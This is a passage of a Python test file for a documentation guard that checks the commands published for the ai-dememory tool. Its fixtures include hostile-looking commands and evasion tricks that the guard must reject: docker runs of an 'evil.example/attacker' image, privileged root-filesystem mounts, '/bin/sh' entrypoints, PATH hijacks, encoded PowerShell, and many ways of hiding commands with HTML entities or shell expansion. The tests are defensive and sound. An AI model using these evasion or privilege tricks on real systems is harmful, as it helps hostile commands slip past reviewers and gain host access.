                "custom-wrapper \\\n"
                "  ai-dememory mcp-config --client codex --require-version 2.1.0"
            ),
        )
        for command in fixtures:
            with self.subTest(command=command):
                errors = _stable_command_errors(
                    command,
                    "2.1.0",
                    "fixture",
                    require_explicit_mcp_root=True,
                )
                self.assertTrue(errors)
                self.assertTrue(
                    any(
                        marker in error
                        for error in errors
                        for marker in (
                            "shell chaining or redirection",
                            "PowerShell call operator",
                            "explicit vault",
                            "not an analyzable ai-dememory command",
                            "literal shell syntax",
                        )
                    )
                )

    def test_guard_validates_sensitive_commands_inside_inline_code(self) -> None:
        allowed = (
            "Use `ai-dememory mcp-config --client codex` after review.",
            "Use <code>ai-dememory mcp-config --client codex</code> after review.",
            "`ai-dememory setup wizard`",
            "`ai-dememory setup plan --json`",
        )
        for text in allowed:
            with self.subTest(text=text):
                self.assertEqual([], _stable_command_errors(text, "2.1.0", "fixture"))

        rejected = (
            "`ai-dememory version-check 0.0.0`",
        )
        for text in rejected:
            with self.subTest(text=text):
                self.assertTrue(_stable_command_errors(text, "2.1.0", "fixture"))

    def test_guard_rejects_wrapped_exact_version_checks(self) -> None:
        errors = _stable_command_errors(
            "custom-wrapper ai-dememory version-check 2.1.0",
            "2.1.0",
            "fixture",
        )
        self.assertTrue(any("not an analyzable ai-dememory command" in error for error in errors))

    def test_guard_rejects_markdown_that_visually_concatenates_sensitive_tokens(self) -> None:
        fixtures = (
            "do**ck**er run --rm ai-dememory:local",
            'pw**sh** -NoProfile -Command "Write-Output (Get-Date)"',
            "ai&#45;dememory mcp&#45;config --client codex",
            "ai&hyphen;dememory version&#45;check 0.0.0",
            "ai-dememory mcp-**config** --client codex",
            "ai-dememory setup **wizard**",
            "ai-dememory setup [plan](https://github.com) --json",
            "pipx install ai-[dememory](https://github.com)",
            "ai-dememory mcp-<!--x-->config --client codex",
            "ai-dememory mcp-<span>config</span> --client codex",
            "ai-d&#101;memory mcp-config --client codex",
            "ai-dememory mcp-conf&#105;g --client codex",
            "&#97;&#105;&#45;&#100;&#101;&#109;&#101;&#109;&#111;&#114;&#121; &#109;&#99;&#112;&#45;&#99;&#111;&#110;&#102;&#105;&#103; --client codex",
            "ai-d**e**memory mcp-config --client codex",
            "ai-dememory mcp-conf**i**g --client codex",
            "ai-d[e](https://github.com/)memory mcp-config --client codex",
            "ai-d[e][x]memory mcp-conf[i][y]g --client codex",
            "ai-d[e][]memory mcp-conf[i][]g --client codex",
            "ai-d[e]memory mcp-conf[i]g --client codex",
            "ai-d~~e~~memory mcp-conf~~i~~g --client codex",
            "ai-d<!--x-->ememory mcp-config --client codex",
            "ai-d<span>e</span>memory mcp-config --client codex",
            'ai-d<span data-x=">">e</span>memory mcp-conf<span data-x=">">i</span>g --client codex',
            "ai-d<!DOCTYPE html>ememory mcp-conf<!DOCTYPE html>ig --client codex",
            "ai-d<?x?>ememory mcp-conf<?x?>ig --client codex",
            "pipx install ai-d&#101;memory",
            "pipx install ai-d**e**memory",
            "ai-d[e](https://example.com/(x))memory mcp-config --client codex",
            "ai-dememory mcp-conf[i](https://example.com/(x))g --client codex",
            "pipx install ai-d[e](https://example.com/(x))memory",
            "ai-d[**e**]memory mcp-config --client codex\n\n[**e**]: https://example.com",
            "ai-dememory mcp-conf[**i**]g --client codex\n\n[**i**]: https://example.com",
            "pipx install ai-d[**e**]memory\n\n[**e**]: https://example.com",
        )
        for command in fixtures:
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(any("literal" in error for error in errors))

        inline_encoded = (
            "Use `ai-d&#101;memory mcp-conf&#105;g --client codex`.",
            "Use <code>ai-d&#x65;memory mcp-conf&#x69;g --client codex</code>.",
        )
        for text in inline_encoded:
            with self.subTest(text=text):
                self.assertTrue(_stable_command_errors(text, "2.1.0", "fixture"))

        multiline_comment = "ai-d<!--\nreview marker\n-->ememory mcp-config --client codex"
        errors = _stable_command_errors(multiline_comment, "2.1.0", "fixture")
        self.assertTrue(any("Markdown-free" in error for error in errors))

    def test_guard_rejects_commands_created_by_rendered_softbreaks(self) -> None:
        fixtures = (
            "Use `ai-dememory\nmcp-config --client codex`",
            "Use `pipx install\nai-dememory`",
            "Use <code>ai-dememory\nmcp-config --client codex</code>",
            "ai-dememory\nmcp-config --client codex",
            "pipx install\nai-dememory",
            "Use `ai-dememory`\n`mcp-config --client codex`",
            "Use [ai-dememory](https://example.com)\n[mcp-config](https://example.com) --client codex",
        )
        for text in fixtures:
            with self.subTest(text=text):
                errors = _stable_command_errors(text, "2.1.0", "fixture")
                self.assertTrue(errors)

        shell_fixtures = (
            "docker run --rm\nai-dememory:local",
            "docker --context default\nrun --rm\nai-dememory:local",
            "docker\nrun --rm\nai-dememory:local",
            "docker\nrun\n--rm\n--name\nreviewed\nai-dememory:local",
            "docker\nrun\n--rm\n--label\none\n--label\ntwo\n--label\nthree\n--label\nfour\n--label\nfive\nai-dememory:local",
            'bash -c "docker\nrun --rm ai-dememory:local"',
            "D=docker;\n$D run --rm ai-dememory:local",
            "D=do\\cker;\n`$D` run --rm ai-dememory:local",
            "R=runtime;\n$R run --rm ai-dememory:local",
            "`$D`\nrun --rm ai-dememory:local",
        )
        for text in shell_fixtures:
            with self.subTest(text=text):
                errors = _stable_command_errors(text, "2.1.0", "fixture")
                self.assertTrue(
                    any("soft line breaks" in error for error in errors),
                    errors,
                )

    def test_guard_allows_nonexecuting_assignment_softbreak_prose(self) -> None:
        text = "D=docker;\n$D images are reviewed documentation artifacts."

        self.assertEqual([], _stable_command_errors(text, "2.1.0", "fixture"))

    def test_guard_allows_nonexecuting_expanded_launcher_prose(self) -> None:
        text = "$D images are reviewed documentation artifacts."

        self.assertEqual([], _stable_command_errors(text, "2.1.0", "fixture"))

    def test_guard_allows_long_noncommand_softbreak_prose(self) -> None:
        text = "\n".join(
            (
                "Docker",
                "documentation is reviewed before publication.",
                "These notes describe local development only.",
                "They do not contain an executable example.",
                "The rendered paragraph remains ordinary prose.",
                "No command is reconstructed across these lines.",
                "Additional prose remains descriptive.",
                "It does not turn into an executable instruction.",
                "The text continues as a normal paragraph.",
                "Readers receive no shell invocation from it.",
                "The bounded scan must keep this control benign.",
                "The final sentence completes the paragraph.",
                "No command appears after the window either.",
            )
        )

        self.assertEqual([], _stable_command_errors(text, "2.1.0", "fixture"))

    def test_guard_allows_docker_prose_with_later_run_words(self) -> None:
        text = "\n".join(
            (
                "Docker smoke also",
                "verifies the generated image documentation.",
                "Docker schedule plan --json is a separate review topic.",
                "Run ai-dememory dev publish-guard before merging.",
            )
        )

        self.assertEqual([], _stable_command_errors(text, "2.1.0", "fixture"))

    def test_guard_rejects_dynamic_shell_token_concatenation(self) -> None:
        fixtures = (
            "$D run --rm ai-dememory:local",
            "& $D run --rm ai-dememory:local",
            "ai-dememory mcp$@-config --client codex",
            "ai$@-dememory mcp-config --client codex",
            "pipx install ai-d$@ememory",
            "ai-dememory mcp$()-config --client codex",
            "ai-dememory mcp%EMPTY%-config --client codex",
            "ai-dememory mcp-{c..c}onfig --client codex",
            "ai-{d..d}ememory mcp-config --client codex",
            "pipx install ai-d{e..e}memory",
            "ai-dememory mcp-con{f..f}ig --client codex",
            "ai-dememory m{c..c}p-config --client codex",
            "ai-dememory setup wi{z..z}ard",
            "ai-dememory version-che{c..c}k 2.1.0",
            "ai-dememory setup wi$''zard",
            "ai-dememory setup wi${UNSET}zard",
            "ai-dememory setup wi$(true)zard",
            "ai-dememory setup wi%X%zard",
            "ai-dememory setup wi!X!zard",
            "a$''i-dememory setup wizard",
            "ai^-dememory mcp^-config --client codex",
            "ai-dememory setup w^izard",
            "ai-dememory setup pla^n",
            "ai-dememory m^cp-config --client codex",
            "ai-dememory v^ersion-check 2.1.0",
            "a^i-dememory setup wizard",
            "pipx install ai-de^memory",
            "& ('ai-'+'dememory') ('mcp-'+'config') --client codex",
            "D=docker $D run --rm ai-dememory:local",
            'D=docker; "$D" run --rm ai-dememory:local',
            'D=docker; "$D" --context default run --rm ai-dememory:local',
            "D=doc${EMPTY}ker $D run --rm ai-dememory:local",
            "export D=docker; ${D} run --rm ai-dememory:local",
            "$D = 'docker'; & $D run --rm ai-dememory:local",
            "set D=docker & %D% run --rm ai-dememory:local",
            'set "D=docker" & %D% run --rm ai-dememory:local',
        )
        for command in fixtures:
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(any("literal shell syntax" in error for error in errors))

    def test_guard_rejects_expanded_docker_launcher_in_code_span(self) -> None:
        errors = _stable_command_errors("`$D` run --rm ai-dememory:local", "2.1.0", "fixture")

        self.assertTrue(any("code spans with shell tokens" in error for error in errors))

    def test_guard_allows_nonexecuting_shell_assignment(self) -> None:
        command = '$env:AI_DEMEMORY_ROOT = "C:\\vault"'
        self.assertEqual([], _stable_command_errors(command, "2.1.0", "fixture"))

    def test_guard_rejects_backtick_code_spans_used_as_shell_fragments(self) -> None:
        fixtures = (
            "ai`-dememory mcp`-config --client codex",
            "ai-dememory setup `wizard`",
            "ai-dememory setup `wizard",
            "ai-dememory mcp`-config --client codex",
            "ai-dememory version`-check 2.1.0",
            "pipx install ai-de`memory",
        )
        for command in fixtures:
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(
                    any(
                        "code spans" in error or "literal shell syntax" in error
                        for error in errors
                    )
                )

    def test_guard_allows_wizard_and_plan_without_runtime_version_gate(self) -> None:
        for command in (
            "ai-dememory --root ~/vault setup wizard",
            "ai-dememory --root ~/vault setup wizard --require-version 2.1.0rc1",
            "ai-dememory --root ~/vault setup plan --json",
            "ai-dememory --root ~/vault setup plan --json --require-version 2.1.0rc1",
            "ai-dememory init ~/vault --wizard",
            "ai-dememory init ~/vault --wizard --require-version 0.0.0",
        ):
            with self.subTest(command=command):
                self.assertEqual([], _stable_command_errors(command, "2.1.0", "fixture"))

        for command in (
            "ai-dememory setup wizard && echo reviewed",
            "ai-dememory setup plan --json && echo reviewed",
            "ai-dememory init ~/vault --wizard && echo reviewed",
        ):
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(any("must not contain shell chaining" in error for error in errors))

    def test_guard_requires_root_and_lease_on_direct_mcp_server(self) -> None:
        rejected = (
            "ai-dememory mcp --stdio",
            "AI_DEMEMORY_ROOT=~/vault ai-dememory mcp --stdio",
            "printf x | ai-dememory mcp --stdio",
            "ai-dememory --root ~/vault mcp --stdio",
            "ai-dememory --root /good mcp --stdio",
            "/tmp/ai-dememory --root /good mcp --stdio",
            "C:/Tools/ai-dememory.exe --root C:/good mcp --stdio",
        )
        for command in rejected:
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(any("direct MCP server" in error for error in errors))
        self.assertEqual(
            [],
            _stable_command_errors(
                "printf x | ai-dememory --root ~/vault mcp --stdio --require-bound-root",
                "2.1.0",
                "fixture",
            ),
        )

        rejected_operators = (
            "ai-dememory mcp --stdio && echo pwn",
            "echo ok && ai-dememory mcp --stdio",
            "ai-dememory mcp --stdio > out.txt",
            "printf x | ai-dememory mcp --stdio | cat",
        )
        for command in rejected_operators:
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(any("only one stdin pipe" in error for error in errors))

        rejected_environment_wrappers = (
            "PATH=/tmp/evil ai-dememory --root /good mcp --stdio",
            "env PATH=/tmp/evil ai-dememory --root /good mcp --stdio",
        )
        for command in rejected_environment_wrappers:
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(any("not an analyzable" in error for error in errors))

        rejected_unbounded_lease = (
            "ai-dememory --root /good mcp --stdio --require-bound-root --idle-timeout-seconds 0",
            "ai-dememory --root /good mcp --stdio --require-bound-root --idle-timeout-seconds=-1",
        )
        for command in rejected_unbounded_lease:
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(any("positive idle lease" in error for error in errors))

    def test_guard_rejects_raw_docker_mcp_servers(self) -> None:
        rejected = (
            "docker run --rm -i -e AI_DEMEMORY_ROOT=/memory -v /vault:/memory ai-dememory:local",
            "docker run --rm -i -e AI_DEMEMORY_ROOT=/memory -v /vault:/memory ai-dememory:local mcp --stdio",
            "docker run --rm -i -e AI_DEMEMORY_ROOT=/memory -v /vault:/memory ai-dememory:local mcp --stdio --require-version 2.1.0",
            "docker run --rm evil.example/attacker/ai-dememory:latest mcp --stdio --idle-timeout-seconds 600 --require-version 2.1.0 --profile core --require-bound-root",
            "docker run --privileged -v /:/memory ai-dememory:local mcp --stdio --idle-timeout-seconds 600 --require-version 2.1.0 --profile core --require-bound-root",
            "docker run --entrypoint /bin/sh ai-dememory:local mcp --stdio --idle-timeout-seconds 600 --require-version 2.1.0 --profile core --require-bound-root",
            "sudo docker run --privileged -v /:/memory ai-dememory:local",
            "env docker run --rm -i -v /vault:/memory ai-dememory:local",
            "command docker run --rm -i -v /vault:/memory ai-dememory:local",
            "wsl docker run --rm -i -v /vault:/memory ai-dememory:local",
            "/usr/bin/docker run --rm -i -v /vault:/memory ai-dememory:local",
            '"C:/Program Files/Docker/docker.exe" run --rm -i -v C:/vault:/memory ai-dememory:local',
            'bash -c "docker run --rm -i -v /vault:/memory ai-dememory:local"',
            '/bin/bash -lc "docker run --rm -i -v /vault:/memory ai-dememory:local"',
            '"C:\\Program Files\\Git\\bin\\bash.exe" -lc "docker run --rm -i -v C:/vault:/memory ai-dememory:local"',
            'cmd /c "docker run --rm -i -v C:/vault:/memory ai-dememory:local"',
            'cmd /k "docker run --rm -i -v C:/vault:/memory ai-dememory:local"',
            'pwsh -Command "docker run --rm -i -v C:/vault:/memory ai-dememory:local"',
            'pwsh -c "docker run --rm -i -v C:/vault:/memory ai-dememory:local"',
            'powershell -command "docker run --rm -i -v C:/vault:/memory ai-dememory:local"',
            'bash -c "echo reviewed" ; pwsh -Command "docker run ai-dememory:local"',
            'bash -c "\'" ; pwsh -Command "docker run ai-dememory:local"',
            'bash -c \'pwsh -Command "docker run ai-dememory:local"\'',
            r".\tools\docker.exe run --rm ai-dememory:local",
            r"..\tools\docker.exe run --rm ai-dememory:local",
            r"\\server\share\docker.exe run --rm ai-dememory:local",
            r"\\?\UNC\server\share\docker.exe run --rm ai-dememory:local",
            r'pwsh -NoProfile -Command ".\tools\docker.exe run --rm ai-dememory:local"',
            r'pwsh -NoProfile -Command "\\server\share\docker.exe run --rm ai-dememory:local"',
        )
        for command in rejected:
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(any("raw docker run" in error for error in errors))

    def test_guard_fails_closed_on_opaque_nested_shell_execution(self) -> None:
        rejected = (
            "powershell -EncodedCommand ZQBjAGgAbwAgAHIAZQB2AGkAZQB3AGUAZAA=",
            "powershell -File scripts/review.ps1",
            "bash scripts/review.sh",
            "cmd /q",
            'bash -c "\'"',
            "bash -c '$(docker run --rm ai-dememory:local)'",
            "bash -c 'eval \"docker run --rm ai-dememory:local\"'",
            'env BASH_ENV=review.sh bash -c "echo reviewed"',
            'bash -i --rcfile=review.sh -c "echo reviewed"',
            'pwsh -Command "& ./review.ps1"',
            'pwsh -NoProfile -Command "Write-Output (Get-Date)"',
            "cmd /c scripts\\review.cmd",
            "cmd /c %RUN_AI_DEMEMORY%",
        )
        for command in rejected:
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(
                    any("nested shell execution cannot be fully inspected" in error for error in errors)
                )

        over_depth = "docker run --rm ai-dememory:local"
        for _ in range(NESTED_SHELL_MAX_DEPTH + 1):
            over_depth = shlex.join(("bash", "-c", over_depth))
        errors = _stable_command_errors(over_depth, "2.1.0", "fixture")
        self.assertTrue(
            any("nested shell execution cannot be fully inspected" in error for error in errors)
        )

    def test_guard_allows_fully_inspectable_benign_shell_wrappers(self) -> None:
        commands = (
            '/bin/bash -c "echo reviewed"',
            'cmd /d /k "echo reviewed"',
            'pwsh -NoProfile -Command "Write-Output reviewed"',
            "PowerShell users can run the equivalent command below.",
            "Bash users can run the equivalent command below.",
            "command -v bash",
            "sudo -u bash echo reviewed",
            "wsl --distribution bash echo reviewed",
        )
        for command in commands:
            with self.subTest(command=command):
                self.assertEqual([], _stable_command_errors(command, "2.1.0", "fixture"))

    def test_guard_requires_tls_in_non_loopback_api_guidance(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            security = copied / "security" / "index.html"
            security.write_text(
                security.read_text(encoding="utf-8").replace(
                    " plus both <code>--tls-cert</code> and <code>--tls-key</code>",
                    "",
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(any("non-loopback API guidance" in error for error in errors))

    def test_guard_rejects_root_overrides_for_every_sensitive_command(self) -> None:
        commands = (
            "ai-dememory --root good mcp-config --client codex --root evil --require-version 2.1.0",
            "ai-dememory --root good setup wizard --root evil --require-version 2.1.0",
            "ai-dememory setup plan --root good --root evil --require-version 2.1.0",
            "ai-dememory --root good mcp --root evil --stdio --require-version 2.1.0",
            "ai-dememory --root good init vault --wizard --root evil --require-version 2.1.0",
        )
        for command in commands:
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(any("must not override --root" in error for error in errors))

    def test_guard_rejects_abbreviated_security_options(self) -> None:
        commands = (
            "ai-dememory mcp-config --client generic --require-version 2.1.0 --root good --ro evil",
            "ai-dememory mcp --stdio --require-version 2.1.0 --root good --ro evil",
            "ai-dememory setup wizard --require-version 2.1.0 --root good --ro evil",
            "ai-dememory init C:/vault --wiz --require-version 2.1.0",
            "ai-dememory mcp --std --require-v=2.1.0",
            "ai-dememory mcp-config --client generic --require-version 2.1.0 --im=--privileged",
            "ai-dememory mcp-config --cl=generic --require-version 2.1.0",
        )
        for command in commands:
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(any("argparse abbreviations" in error for error in errors))

    def test_guard_rejects_ephemeral_package_runners(self) -> None:
        commands = (
            "pipx run ai-dememory",
            "uvx ai-dememory",
            "uv tool run ai-dememory",
            "uv run --with ai-dememory ai-dememory --help",
            "uv run --with ai-dememory==2.1.0 ai-dememory --help",
            "uv run --with=ai-dememory ai-dememory --help",
            "python -m uv run --with ai-dememory ai-dememory --help",
            "python -m pipx run ai-dememory",
            "py -3.12 -m pipx run ai-dememory",
            "custom-wrapper pipx run ai-dememory",
            "pipx.exe run ai-dememory",
            "C:\\Tools\\pipx.exe run ai-dememory",
            "uvx.exe ai-dememory",
            "C:/Tools/uvx.exe ai-dememory",
            "/usr/bin/uvx ai-dememory",
            "/usr/bin/pipx run ai-dememory",
            "/usr/bin/uv run --with ai-dememory ai-dememory --version",
            "pipx --global run ai-dememory",
            "uv --offline run --with ai-dememory ai-dememory --version",
            "python -m pipx --quiet run ai-dememory",
            "python -m uv --offline run --with ai-dememory ai-dememory --version",
            "py -3.12 -m uv --offline run --with ai-dememory ai-dememory --version",
        )
        for command in commands:
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(any("ephemeral package runners" in error for error in errors))

    def test_guard_rejects_internal_python_cli_execution(self) -> None:
        commands = (
            'python -c "from ai_dememory_tool.cli import main; main([\'setup\',\'wizard\'])"',
            'python -c "__import__(\'ai_dememory_tool.cli\').cli.main([\'setup\',\'plan\'])"',
            "python -m ai_dememory_tool.cli setup wizard",
            "python -m ai_dememory_tool.admin.setup_plan plan --json",
            "python -m ai_dememory_tool.admin.onboarding --json",
            "python -m ai_dememory_tool.mcp_server.memory_mcp --stdio --root ~/vault",
            'python -c "from ai_dememory_tool.admin import setup_plan; setup_plan.main([\'plan\'])"',
            "python scripts/setup_plan.py plan --json",
            "py -3 scripts/setup_plan.py plan --json",
            "python scripts/onboarding.py --json",
            "python mcp/server/memory_mcp.py --stdio --root ~/vault",
            "/usr/bin/python3 -m ai_dememory_tool.admin.setup_plan plan --json",
            "C:/Python312/python.exe -m ai_dememory_tool.admin.setup_plan plan --json",
            "C:\\Python312\\python.exe scripts/setup_plan.py plan --json",
            "/usr/bin/python scripts/onboarding.py --json",
            "env /usr/bin/python3 -m ai_dememory_tool.mcp_server.memory_mcp --stdio",
        )
        for command in commands:
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(any("internal Python CLI API" in error for error in errors))

        self.assertEqual(
            [],
            _stable_command_errors(
                "python3 -m compileall -q scripts mcp/server ai_dememory_tool",
                "2.1.0",
                "fixture",
            ),
        )

    def test_profile_guide_requires_an_explicit_vault_root_for_every_mcp_config(self) -> None:
        without_root = "ai-dememory mcp-config --client codex"
        errors = _stable_command_errors(
            without_root,
            "2.1.0",
            "fixture",
            require_explicit_mcp_root=True,
        )
        self.assertTrue(any("explicit vault" in error for error in errors))

        with_root = "ai-dememory --root ~/code/my-memory mcp-config --client codex"
        self.assertEqual(
            [],
            _stable_command_errors(
                with_root,
                "2.1.0",
                "fixture",
                require_explicit_mcp_root=True,
            ),
        )

        rejected_overrides = (
            (
                "ai-dememory --root safe mcp-config --root evil --client codex"
            ),
            (
                "ai-dememory --root=safe mcp-config --root=evil --client codex"
            ),
            (
                "ai-dememory mcp-config --root safe --client codex"
            ),
        )
        for command in rejected_overrides:
            with self.subTest(command=command):
                errors = _stable_command_errors(
                    command,
                    "2.1.0",
                    "fixture",
                    require_explicit_mcp_root=True,
                )
                self.assertTrue(any("no later override" in error for error in errors))

    def test_guard_allows_explicit_source_checkout_install_forms(self) -> None:
        source_commands = """pipx install .
python3 -m pip install -e .
"""
        self.assertEqual(
            [],
            _stable_command_errors(source_commands, "2.1.0", "source fixture"),
        )

    def test_guard_rejects_resource_profile_drift(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            install = copied / "install/index.html"
            install.write_text(
                install.read_text(encoding="utf-8").replace("Up to 1,200 tokens", "Up to 1,500 tokens", 1),
                encoding="utf-8",
            )
            errors = audit_site(REPO_ROOT, copied)
            self.assertTrue(any("resource profile 'balanced'" in error for error in errors))

    def test_install_commands_remain_available_without_javascript(self) -> None:
        install = (SITE_ROOT / "install/index.html").read_text(encoding="utf-8")
        self.assertIn("pipx install ai-dememory==2.1.0", install)
        self.assertIn(
            "ai-dememory init ~/code/my-memory --wizard --require-version 2.1.0",
            install,
        )
        self.assertIn("ai-dememory init ~/code/my-memory --wizard", install)
        self.assertIn("ai-dememory --root ~/code/my-memory mcp-config --client codex", install)
        self.assertIn(SOURCE_CANDIDATE_NOT_INSTALLABLE_MARKER, install)
        self.assertNotIn("pipx install ai-dememory==2.1.1rc1", install)
        self.assertNotIn('class="copy-button"', install)
        self.assertIn("document.createElement(\"button\")", (SITE_ROOT / "assets/site.js").read_text(encoding="utf-8"))

    def test_clipboard_fallback_selects_commands_and_updates_accessible_status(self) -> None:
        javascript = (SITE_ROOT / "assets/site.js").read_text(encoding="utf-8")
        self.assertIn("document.createRange()", javascript)
        self.assertIn("range.selectNodeContents(code)", javascript)
        self.assertIn("Clipboard unavailable; commands selected", javascript)
        self.assertIn("Clipboard unavailable; select commands manually", javascript)

    def test_home_payload_stays_below_documented_budget(self) -> None:
        total = sum(
            path.stat().st_size
            for path in (
                SITE_ROOT / "index.html",
                SITE_ROOT / "assets/site.css",
                SITE_ROOT / "assets/site.js",
            )
        )
        self.assertLessEqual(total, 250 * 1024)


if __name__ == "__main__":
    unittest.main()
